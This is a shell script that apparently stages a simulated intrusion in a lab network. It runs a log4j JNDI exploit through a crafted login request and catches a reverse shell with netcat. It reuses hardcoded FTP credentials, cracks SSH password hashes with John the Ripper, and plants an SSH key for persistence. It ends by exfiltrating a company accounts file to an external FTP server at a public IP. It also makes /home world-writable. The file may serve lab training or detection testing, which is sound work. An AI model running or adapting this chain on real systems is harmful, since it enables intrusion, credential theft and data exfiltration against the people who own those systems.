#!/bin/sh

#Setup john-the-ripper (jumbo)
cd ~/src/john/src
./configure && make -s clean && make -sj4

cd /home

chmod -R 777 /home

#Scan web service for service versions
nmap -sC -sV 172.16.0.2

#Check if web server is vulnerable to log4j (response status 200 means vulnerable)
./pwn.py --target http://172.16.0.2:8080 --exploit-host 172.16.0.9 

#Start LDAP server
python3 /home/poc.py --userip 172.16.0.9 --webport 8000 --lport 9001 &> /dev/null &

sleep 5

#Run log4j exploit
curl -s -L --cookie-jar cookies.txt -d 'uname=${jndi:ldap://172.16.0.9:1389/a}&password=password' http://172.16.0.2:8080/login | grep -E 'invalid|Welcome' &> /dev/null & 

#Start netcat to listen for reverse shell
nc -nlvp 9001

#Once connection received, enter "bash ./attacker.sh" to simulate cmds attacker would execute inside the shell to retrieve ftp credentials, then "exit" once done

#Using found credentials:
ftp 172.16.0.3
#Enter username "ross", password "joyofpainting"
#Inside ftp, enter "cd ftpdir", "get pass.txt" to extract ssh credentials, "exit" to close ftp connection

awk 'END {print $NF}' pass.txt > ssh_enc.txt

#Crack ssh credentials
~/src/john/run/john --format=raw-sha512 /home/ssh_enc.txt

#Attempt to login with cracked credentials
ssh bob@172.16.0.4
#Enter "yes" to accept keys, then enter password "d0ck3r", "exit" once done

#Transfer attacker's public key over to ssh workstation for persistence
ssh-copy-id -f -i ./id_rsa.pub bob@172.16.0.4
#Enter password cracked with john, "d0ck3r"

#Copy over file found in bob's home dir
scp -i id_rsa bob@172.16.0.4:/home/bob/Company_Accounts.xlsx /home

#Perform exfiltration of confidential file to external FTP server
touch ftpcommands.txt
echo $'open 18.183.214.29\nuser savemygpa 3204\nput Company_Accounts.xlsx  $'\"Company_Accounts_'$(hostname)'_'$(date).txt$'\"\nbye\nbye' > ftpcommands.txt
ftp -n < ftpcommands.txt
rm -r ftpcommands.txt
